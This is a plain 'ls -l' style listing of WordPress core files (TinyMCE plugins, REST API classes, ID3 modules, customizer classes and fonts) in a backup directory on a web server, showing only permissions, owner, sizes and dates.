-rw-r--r-- 1 www-data www-data 790 Apr 25  2012 /var/www/backup_wordpress/wp-includes/js/imgareaselect/imgareaselect.css
-rw-r--r-- 1 www-data www-data 38133 Jul 20  2015 /var/www/backup_wordpress/wp-includes/js/imgareaselect/jquery.imgareaselect.js
-rw-r--r-- 1 www-data www-data 178 Nov  7  2012 /var/www/backup_wordpress/wp-includes/js/imgareaselect/border-anim-h.gif
-rw-r--r-- 1 www-data www-data 9887 Jul 20  2015 /var/www/backup_wordpress/wp-includes/js/imgareaselect/jquery.imgareaselect.min.js
-rw-r--r-- 1 www-data www-data 2172 Jul 13  2015 /var/www/backup_wordpress/wp-includes/js/wp-a11y.js
-rw-r--r-- 1 www-data www-data 22423 Feb 17  2016 /var/www/backup_wordpress/wp-includes/js/media-audiovideo.js
-rw-r--r-- 1 www-data www-data 15599 Dec 16  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/langs/wp-langs-en.js
-rw-r--r-- 1 www-data www-data 1983 Jun 30  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/utils/editable_selects.js
-rw-r--r-- 1 www-data www-data 5850 Jun 30  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/utils/validate.js
-rw-r--r-- 1 www-data www-data 3940 Jun 30  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/utils/mctabs.js
-rw-r--r-- 1 www-data www-data 5792 Jun 30  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/utils/form_utils.js
-rw-r--r-- 1 www-data www-data 16455 Jan 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/image/plugin.js
-rw-r--r-- 1 www-data www-data 8421 Jan 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/image/plugin.min.js
-rw-r--r-- 1 www-data www-data 1465 Jun 30  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/directionality/plugin.js
-rw-r--r-- 1 www-data www-data 726 Feb 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/directionality/plugin.min.js
-rw-r--r-- 1 www-data www-data 20017 Dec 28  2013 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/media/moxieplayer.swf
-rw-r--r-- 1 www-data www-data 22142 Mar  1  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/media/plugin.js
-rw-r--r-- 1 www-data www-data 11556 Mar  2  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/media/plugin.min.js
-rw-r--r-- 1 www-data www-data 5966 Apr  8  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpautoresize/plugin.js
-rw-r--r-- 1 www-data www-data 2399 Apr  8  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpautoresize/plugin.min.js
-rw-r--r-- 1 www-data www-data 11173 Jan 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/charmap/plugin.js
-rw-r--r-- 1 www-data www-data 7944 Feb 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/charmap/plugin.min.js
-rw-r--r-- 1 www-data www-data 648 Jun 30  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/hr/plugin.js
-rw-r--r-- 1 www-data www-data 322 Feb 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/hr/plugin.min.js
-rw-r--r-- 1 www-data www-data 3546 Mar  9  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpemoji/plugin.js
-rw-r--r-- 1 www-data www-data 1567 Mar  9  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpemoji/plugin.min.js
-rw-r--r-- 1 www-data www-data 2505 Jan 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/tabfocus/plugin.js
-rw-r--r-- 1 www-data www-data 1270 Feb 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/tabfocus/plugin.min.js
-rw-r--r-- 1 www-data www-data 28830 Mar 13  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpeditimage/plugin.js
-rw-r--r-- 1 www-data www-data 14166 Mar 13  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpeditimage/plugin.min.js
-rw-r--r-- 1 www-data www-data 6656 Jun 30  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/textcolor/plugin.js
-rw-r--r-- 1 www-data www-data 3800 Feb 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/textcolor/plugin.min.js
-rw-r--r-- 1 www-data www-data 6937 Mar 16  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wptextpattern/plugin.js
-rw-r--r-- 1 www-data www-data 3042 Mar 16  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wptextpattern/plugin.min.js
-rw-r--r-- 1 www-data www-data 2450 Jun 30  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/colorpicker/plugin.js
-rw-r--r-- 1 www-data www-data 1222 Feb 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/colorpicker/plugin.min.js
-rw-r--r-- 1 www-data www-data 20757 Mar 15  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/lists/plugin.js
-rw-r--r-- 1 www-data www-data 8578 Mar 15  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/lists/plugin.min.js
-rw-r--r-- 1 www-data www-data 3581 Mar  1  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/fullscreen/plugin.js
-rw-r--r-- 1 www-data www-data 1674 Mar  1  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/fullscreen/plugin.min.js
-rw-r--r-- 1 www-data www-data 27079 Mar 16  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wordpress/plugin.js
-rw-r--r-- 1 www-data www-data 13908 Mar 16  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wordpress/plugin.min.js
-rw-r--r-- 1 www-data www-data 20793 Nov 10  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpview/plugin.js
-rw-r--r-- 1 www-data www-data 8657 Nov 10  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpview/plugin.min.js
-rw-r--r-- 1 www-data www-data 2436 Apr  8  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpdialogs/plugin.js
-rw-r--r-- 1 www-data www-data 1345 Apr  8  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpdialogs/plugin.min.js
-rw-r--r-- 1 www-data www-data 8280 Jan 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/compat3x/plugin.js
-rw-r--r-- 1 www-data www-data 8072 Jun 18  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/compat3x/css/dialog.css
-rw-r--r-- 1 www-data www-data 3987 Mar 18  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/compat3x/plugin.min.js
-rw-r--r-- 1 www-data www-data 15266 Apr 11  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wplink/plugin.js
-rw-r--r-- 1 www-data www-data 7684 Apr 11  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wplink/plugin.min.js
-rw-r--r-- 1 www-data www-data 444 Oct 26  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpembed/plugin.js
-rw-r--r-- 1 www-data www-data 280 Oct 26  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpembed/plugin.min.js
-rw-r--r-- 1 www-data www-data 48524 Mar  1  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/paste/plugin.js
-rw-r--r-- 1 www-data www-data 16176 Mar  1  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/paste/plugin.min.js
-rw-r--r-- 1 www-data www-data 3180 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpgallery/plugin.js
-rw-r--r-- 1 www-data www-data 1661 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/plugins/wpgallery/plugin.min.js
-rw-r--r-- 1 www-data www-data 15089 Jun 30  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/tiny_mce_popup.js
-rw-r--r-- 1 www-data www-data 167360 Apr 11  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/wp-tinymce.js.gz
-rw-r--r-- 1 www-data www-data 9293 Mar 15  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/themes/modern/theme.min.js
-rw-r--r-- 1 www-data www-data 21279 Mar 15  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/themes/modern/theme.js
-rw-r--r-- 1 www-data www-data 1126 Jan  2  2015 /var/www/backup_wordpress/wp-includes/js/tinymce/wp-tinymce.php
-rw-r--r-- 1 www-data www-data 26427 Apr 11  2011 /var/www/backup_wordpress/wp-includes/js/tinymce/license.txt
-rw-r--r-- 1 www-data www-data 368 Dec  1  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images/dashicon-edit.png
-rw-r--r-- 1 www-data www-data 447 Feb 13  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images/gallery-2x.png
-rw-r--r-- 1 www-data www-data 363 Feb 13  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images/video.png
-rw-r--r-- 1 www-data www-data 414 Oct 28  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images/more.png
-rw-r--r-- 1 www-data www-data 290 Mar  4  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images/playlist-video.png
-rw-r--r-- 1 www-data www-data 8177 Nov 25  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images/embedded.png
-rw-r--r-- 1 www-data www-data 379 Feb 13  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images/gallery.png
-rw-r--r-- 1 www-data www-data 603 Oct 28  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images/more-2x.png
-rw-r--r-- 1 www-data www-data 440 Mar  4  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images/playlist-audio.png
-rw-r--r-- 1 www-data www-data 339 Dec  1  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images/dashicon-no.png
-rw-r--r-- 1 www-data www-data 1140 Oct 28  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images/pagebreak.png
-rw-r--r-- 1 www-data www-data 835 Apr  3  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images/pagebreak-2x.png
-rw-r--r-- 1 www-data www-data 412 Feb 13  2014 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/images/audio.png
-rw-r--r-- 1 www-data www-data 9192 Mar 13  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/wordpress/wp-content.css
-rw-r--r-- 1 www-data www-data 2676 Mar  1  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/content.inline.min.css
-rw-r--r-- 1 www-data www-data 31322 Mar  1  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/skin.ie7.min.css
-rw-r--r-- 1 www-data www-data 24727 Jan 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce-small.svg
-rw-r--r-- 1 www-data www-data 87654 Mar  1  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce.json
-rw-r--r-- 1 www-data www-data 9380 Jan 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce-small.woff
-rw-r--r-- 1 www-data www-data 45226 Mar  1  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce.svg
-rw-r--r-- 1 www-data www-data 17128 Mar  1  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce.ttf
-rw-r--r-- 1 www-data www-data 67 Dec 28  2013 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/readme.md
-rw-r--r-- 1 www-data www-data 40273 Jan 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce-small.json
-rw-r--r-- 1 www-data www-data 17292 Mar  1  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce.eot
-rw-r--r-- 1 www-data www-data 9492 Jan 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce-small.eot
-rw-r--r-- 1 www-data www-data 17204 Mar  1  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce.woff
-rw-r--r-- 1 www-data www-data 9304 Jan 19  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/fonts/tinymce-small.ttf
-rw-r--r-- 1 www-data www-data 33402 Mar  2  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/skin.min.css
-rw-r--r-- 1 www-data www-data 43 Dec 28  2013 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/img/trans.gif
-rw-r--r-- 1 www-data www-data 2608 Dec 28  2013 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/img/loader.gif
-rw-r--r-- 1 www-data www-data 152 Dec 28  2013 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/img/object.gif
-rw-r--r-- 1 www-data www-data 53 Dec 28  2013 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/img/anchor.gif
-rw-r--r-- 1 www-data www-data 3091 Mar  1  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/skins/lightgray/content.min.css
-rw-r--r-- 1 www-data www-data 373446 Mar 23  2016 /var/www/backup_wordpress/wp-includes/js/tinymce/tinymce.min.js
-rw-r--r-- 1 www-data www-data 30214 Sep 16  2015 /var/www/backup_wordpress/wp-includes/js/media-editor.js
-rw-r--r-- 1 www-data www-data 3714 Jun 13  2015 /var/www/backup_wordpress/wp-includes/js/wp-util.js
-rw-r--r-- 1 www-data www-data 1783 Jan 13  2016 /var/www/backup_wordpress/wp-includes/js/wp-auth-check.min.js
-rw-r--r-- 1 www-data www-data 4705 Mar  8  2016 /var/www/backup_wordpress/wp-includes/js/customize-preview-nav-menus.min.js
-rw-r--r-- 1 www-data www-data 2949 Dec 20  2012 /var/www/backup_wordpress/wp-includes/js/crop/cropper.css
-rw-r--r-- 1 www-data www-data 277 Nov  7  2012 /var/www/backup_wordpress/wp-includes/js/crop/marqueeHoriz.gif
-rw-r--r-- 1 www-data www-data 16485 May  4  2007 /var/www/backup_wordpress/wp-includes/js/crop/cropper.js
-rw-r--r-- 1 www-data www-data 293 Nov  7  2012 /var/www/backup_wordpress/wp-includes/js/crop/marqueeVert.gif
-rw-r--r-- 1 www-data www-data 3639 Nov 13  2013 /var/www/backup_wordpress/wp-includes/js/wp-pointer.min.js
-rw-r--r-- 1 www-data www-data 7099 Mar  9  2016 /var/www/backup_wordpress/wp-includes/js/twemoji.min.js
-rw-r--r-- 1 www-data www-data 4839 Mar 16  2016 /var/www/backup_wordpress/wp-includes/js/wp-emoji-loader.js
-rw-r--r-- 1 www-data www-data 18422 Oct  6  2015 /var/www/backup_wordpress/wp-includes/js/json2.js
-rw-r--r-- 1 www-data www-data 2594 Oct  7  2015 /var/www/backup_wordpress/wp-includes/js/shortcode.min.js
-rw-r--r-- 1 www-data www-data 3132 Oct  6  2015 /var/www/backup_wordpress/wp-includes/js/json2.min.js
-rw-r--r-- 1 www-data www-data 13711 Jul  6  2015 /var/www/backup_wordpress/wp-includes/js/media-models.min.js
-rw-r--r-- 1 www-data www-data 10727 Jun 28  2015 /var/www/backup_wordpress/wp-includes/js/quicktags.min.js
-rw-r--r-- 1 www-data www-data 5817 Mar 13  2016 /var/www/backup_wordpress/wp-includes/js/wp-emoji.js
-rw-r--r-- 1 www-data www-data 2085 Jan 13  2016 /var/www/backup_wordpress/wp-includes/js/wp-ajax-response.min.js
-rw-r--r-- 1 www-data www-data 18921 Mar 21  2016 /var/www/backup_wordpress/wp-includes/js/customize-preview-widgets.js
-rw-r--r-- 1 www-data www-data 7658 Mar 21  2016 /var/www/backup_wordpress/wp-includes/js/customize-selective-refresh.min.js
-rw-r--r-- 1 www-data www-data 11697 Jun 22  2015 /var/www/backup_wordpress/wp-includes/bookmark-template.php
-rw-r--r-- 1 www-data www-data 11446 Mar 14  2016 /var/www/backup_wordpress/wp-includes/category.php
-rw-r--r-- 1 www-data www-data 10328 Jan  8  2016 /var/www/backup_wordpress/wp-includes/session.php
-rw-r--r-- 1 www-data www-data 12207 Feb 26  2016 /var/www/backup_wordpress/wp-includes/ms-deprecated.php
-rw-r--r-- 1 www-data www-data 22978 Mar 16  2016 /var/www/backup_wordpress/wp-includes/rest-api/class-wp-rest-request.php
-rw-r--r-- 1 www-data www-data 35341 Apr  6  2016 /var/www/backup_wordpress/wp-includes/rest-api/class-wp-rest-server.php
-rw-r--r-- 1 www-data www-data 7629 Mar 16  2016 /var/www/backup_wordpress/wp-includes/rest-api/class-wp-rest-response.php
-rw-r--r-- 1 www-data www-data 18344 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/module.tag.apetag.php
-rw-r--r-- 1 www-data www-data 18517 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/module.audio.flac.php
-rw-r--r-- 1 www-data www-data 44860 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/getid3.lib.php
-rw-r--r-- 1 www-data www-data 127077 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/module.audio-video.asf.php
-rw-r--r-- 1 www-data www-data 11238 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/module.tag.lyrics3.php
-rw-r--r-- 1 www-data www-data 118933 Sep 11  2014 /var/www/backup_wordpress/wp-includes/ID3/module.audio-video.riff.php
-rw-r--r-- 1 www-data www-data 118771 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/module.audio-video.quicktime.php
-rw-r--r-- 1 www-data www-data 99177 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/module.audio.mp3.php
-rw-r--r-- 1 www-data www-data 63627 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/getid3.php
-rw-r--r-- 1 www-data www-data 11572 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/module.tag.id3v1.php
-rw-r--r-- 1 www-data www-data 1307 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/license.commercial.txt
-rw-r--r-- 1 www-data www-data 144599 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/module.tag.id3v2.php
-rw-r--r-- 1 www-data www-data 103541 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/module.audio-video.matroska.php
-rw-r--r-- 1 www-data www-data 25401 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/module.audio-video.flv.php
-rw-r--r-- 1 www-data www-data 24652 Sep 11  2014 /var/www/backup_wordpress/wp-includes/ID3/readme.txt
-rw-r--r-- 1 www-data www-data 10467 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/module.audio.dts.php
-rw-r--r-- 1 www-data www-data 39986 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/module.audio.ogg.php
-rw-r--r-- 1 www-data www-data 1356 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/license.txt
-rw-r--r-- 1 www-data www-data 19009 Jun 27  2015 /var/www/backup_wordpress/wp-includes/ID3/module.audio.ac3.php
-rw-r--r-- 1 www-data www-data 9136 Jan 25  2016 /var/www/backup_wordpress/wp-includes/ms-settings.php
-rw-r--r-- 1 www-data www-data 19545 Jan 27  2016 /var/www/backup_wordpress/wp-includes/class-wp-user.php
-rw-r--r-- 1 www-data www-data 55571 Mar 10  2016 /var/www/backup_wordpress/wp-includes/post-template.php
-rw-r--r-- 1 www-data www-data 2576 Mar  8  2016 /var/www/backup_wordpress/wp-includes/random_compat/random_bytes_libsodium.php
-rw-r--r-- 1 www-data www-data 2461 Mar  8  2016 /var/www/backup_wordpress/wp-includes/random_compat/cast_to_int.php
-rw-r--r-- 1 www-data www-data 2540 Mar  8  2016 /var/www/backup_wordpress/wp-includes/random_compat/random_bytes_com_dotnet.php
-rw-r--r-- 1 www-data www-data 7694 Mar  8  2016 /var/www/backup_wordpress/wp-includes/random_compat/random.php
-rw-r--r-- 1 www-data www-data 5697 Mar  8  2016 /var/www/backup_wordpress/wp-includes/random_compat/random_int.php
-rw-r--r-- 1 www-data www-data 4543 Mar  8  2016 /var/www/backup_wordpress/wp-includes/random_compat/random_bytes_dev_urandom.php
-rw-r--r-- 1 www-data www-data 1533 Oct 22  2015 /var/www/backup_wordpress/wp-includes/random_compat/error_polyfill.php
-rw-r--r-- 1 www-data www-data 2574 Mar  8  2016 /var/www/backup_wordpress/wp-includes/random_compat/random_bytes_openssl.php
-rw-r--r-- 1 www-data www-data 2576 Mar  8  2016 /var/www/backup_wordpress/wp-includes/random_compat/random_bytes_libsodium_legacy.php
-rw-r--r-- 1 www-data www-data 5651 Mar  8  2016 /var/www/backup_wordpress/wp-includes/random_compat/byte_safe_strings.php
-rw-r--r-- 1 www-data www-data 2306 Mar  8  2016 /var/www/backup_wordpress/wp-includes/random_compat/random_bytes_mcrypt.php
-rw-r--r-- 1 www-data www-data 83048 Mar 16  2016 /var/www/backup_wordpress/wp-includes/user.php
-rw-r--r-- 1 www-data www-data 10988 Mar 14  2016 /var/www/backup_wordpress/wp-includes/functions.wp-scripts.php
-rw-r--r-- 1 www-data www-data 11949 Nov 18  2015 /var/www/backup_wordpress/wp-includes/ms-load.php
-rw-r--r-- 1 www-data www-data 9361 Oct 24  2015 /var/www/backup_wordpress/wp-includes/class-wp-customize-section.php
-rw-r--r-- 1 www-data www-data 19604 Dec 13  2015 /var/www/backup_wordpress/wp-includes/class-wp-tax-query.php
-rw-r--r-- 1 www-data www-data 5021 May 23  2015 /var/www/backup_wordpress/wp-includes/class-wp-error.php
-rw-r--r-- 1 www-data www-data 19639 Mar 30  2016 /var/www/backup_wordpress/wp-includes/http.php
-rw-r--r-- 1 www-data www-data 37345 Dec 23  2015 /var/www/backup_wordpress/wp-includes/class-smtp.php
-rw-r--r-- 1 www-data www-data 6109 Sep 26  2015 /var/www/backup_wordpress/wp-includes/class-wp-http-cookie.php
-rw-r--r-- 1 www-data www-data 52245 Apr  5  2016 /var/www/backup_wordpress/wp-includes/class-wp-editor.php
-rw-r--r-- 1 www-data www-data 26251 Dec 23  2015 /var/www/backup_wordpress/wp-includes/nav-menu-template.php
-rw-r--r-- 1 www-data www-data 108047 Mar 30  2016 /var/www/backup_wordpress/wp-includes/deprecated.php
-rw-r--r-- 1 www-data www-data 15054 Sep 19  2015 /var/www/backup_wordpress/wp-includes/wp-diff.php
-rw-r--r-- 1 www-data www-data 2335 Mar 22  2016 /var/www/backup_wordpress/wp-includes/class-walker-page-dropdown.php
-rw-r--r-- 1 www-data www-data 176 Jan  8  2012 /var/www/backup_wordpress/wp-includes/registration-functions.php
-rw-r--r-- 1 www-data www-data 12950 Jun 28  2015 /var/www/backup_wordpress/wp-includes/Text/Diff.php
-rw-r--r-- 1 www-data www-data 8354 Oct 24  2015 /var/www/backup_wordpress/wp-includes/Text/Diff/Engine/string.php
-rw-r--r-- 1 www-data www-data 5170 Feb 18  2010 /var/www/backup_wordpress/wp-includes/Text/Diff/Engine/shell.php
-rw-r--r-- 1 www-data www-data 15840 May 25  2013 /var/www/backup_wordpress/wp-includes/Text/Diff/Engine/native.php
-rw-r--r-- 1 www-data www-data 2210 May 25  2013 /var/www/backup_wordpress/wp-includes/Text/Diff/Engine/xdiff.php
-rw-r--r-- 1 www-data www-data 6813 Jun 28  2015 /var/www/backup_wordpress/wp-includes/Text/Diff/Renderer.php
-rw-r--r-- 1 www-data www-data 5535 Feb 18  2010 /var/www/backup_wordpress/wp-includes/Text/Diff/Renderer/inline.php
-rw-r--r-- 1 www-data www-data 18230 Mar 10  2016 /var/www/backup_wordpress/wp-includes/rest-api.php
-rw-r--r-- 1 www-data www-data 43825 Mar  9  2016 /var/www/backup_wordpress/wp-includes/embed.php
-rw-r--r-- 1 www-data www-data 20920 Sep 16  2015 /var/www/backup_wordpress/wp-includes/class-pop3.php
-rw-r--r-- 1 www-data www-data 1045 Dec 11  2013 /var/www/backup_wordpress/wp-includes/wlwmanifest.xml
-rw-r--r-- 1 www-data www-data 84394 Mar  9  2016 /var/www/backup_wordpress/wp-includes/comment-template.php
-rw-r--r-- 1 www-data www-data 80226 Mar  8  2016 /var/www/backup_wordpress/wp-includes/ms-functions.php
-rw-r--r-- 1 www-data www-data 6951 Aug 25  2015 /var/www/backup_wordpress/wp-includes/post-formats.php
-rw-r--r-- 1 www-data www-data 2618 Oct 20  2015 /var/www/backup_wordpress/wp-includes/feed-rdf.php
-rw-r--r-- 1 www-data www-data 2973 Mar  7  2016 /var/www/backup_wordpress/wp-includes/template-loader.php
-rw-r--r-- 1 www-data www-data 26398 Feb 18  2016 /var/www/backup_wordpress/wp-includes/load.php
-rw-r--r-- 1 www-data www-data 4741 Feb 28  2016 /var/www/backup_wordpress/wp-includes/ms-default-constants.php
-rw-r--r-- 1 www-data www-data 198545 Mar 22  2016 /var/www/backup_wordpress/wp-includes/class-wp-xmlrpc-server.php
-rw-r--r-- 1 www-data www-data 342 Feb 27  2016 /var/www/backup_wordpress/wp-includes/embed-template.php
-rw-r--r-- 1 www-data www-data 126295 Mar 10  2016 /var/www/backup_wordpress/wp-includes/link-template.php
-rw-r--r-- 1 www-data www-data 118006 Mar 30  2016 /var/www/backup_wordpress/wp-includes/general-template.php
-rw-r--r-- 1 www-data www-data 14947 Dec 14  2015 /var/www/backup_wordpress/wp-includes/class-wp-http-streams.php
-rw-r--r-- 1 www-data www-data 7155 Oct 12  2015 /var/www/backup_wordpress/wp-includes/post-thumbnail-template.php
-rw-r--r-- 1 www-data www-data 32458 Jan 25  2016 /var/www/backup_wordpress/wp-includes/plugin.php
-rw-r--r-- 1 www-data www-data 279565 Feb 18  2016 /var/www/backup_wordpress/wp-includes/certificates/ca-bundle.crt
-rw-r--r-- 1 www-data www-data 2156 Mar 22  2016 /var/www/backup_wordpress/wp-includes/class-walker-category-dropdown.php
-rw-r--r-- 1 www-data www-data 9125 Jan 17  2016 /var/www/backup_wordpress/wp-includes/class-wp-network.php
-rw-r--r-- 1 www-data www-data 35533 Feb 28  2016 /var/www/backup_wordpress/wp-includes/l10n.php
-rw-r--r-- 1 www-data www-data 95916 Mar 18  2016 /var/www/backup_wordpress/wp-includes/fonts/dashicons.svg
-rw-r--r-- 1 www-data www-data 26124 Mar 18  2016 /var/www/backup_wordpress/wp-includes/fonts/dashicons.woff
-rw-r--r-- 1 www-data www-data 41728 Mar 18  2016 /var/www/backup_wordpress/wp-includes/fonts/dashicons.ttf
-rw-r--r-- 1 www-data www-data 22449 Mar 18  2016 /var/www/backup_wordpress/wp-includes/fonts/dashicons.eot
-rw-r--r-- 1 www-data www-data 16659 Mar  3  2016 /var/www/backup_wordpress/wp-includes/class-wp-admin-bar.php
-rw-r--r-- 1 www-data www-data 2465 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-color-control.php
-rw-r--r-- 1 www-data www-data 745 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-nav-menu-section.php
-rw-r--r-- 1 www-data www-data 607 Feb 27  2016 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-filter-setting.php
-rw-r--r-- 1 www-data www-data 1103 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-sidebar-section.php
-rw-r--r-- 1 www-data www-data 508 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-background-image-setting.php
-rw-r--r-- 1 www-data www-data 18959 Feb 22  2016 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-nav-menu-setting.php
-rw-r--r-- 1 www-data www-data 1005 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-nav-menu-auto-add-control.php
-rw-r--r-- 1 www-data www-data 977 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-upload-control.php
-rw-r--r-- 1 www-data www-data 3289 Mar 16  2016 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-site-icon-control.php
-rw-r--r-- 1 www-data www-data 1821 Nov 13  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-widget-area-customize-control.php
-rw-r--r-- 1 www-data www-data 7725 Mar 30  2016 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-media-control.php
-rw-r--r-- 1 www-data www-data 1737 Feb 28  2016 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-image-control.php
-rw-r--r-- 1 www-data www-data 9180 Mar 16  2016 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-partial.php
-rw-r--r-- 1 www-data www-data 1028 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-background-image-control.php
-rw-r--r-- 1 www-data www-data 708 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-new-menu-control.php
-rw-r--r-- 1 www-data www-data 6373 Mar 30  2016 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-nav-menu-item-control.php
-rw-r--r-- 1 www-data www-data 2904 Mar  9  2016 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-nav-menus-panel.php
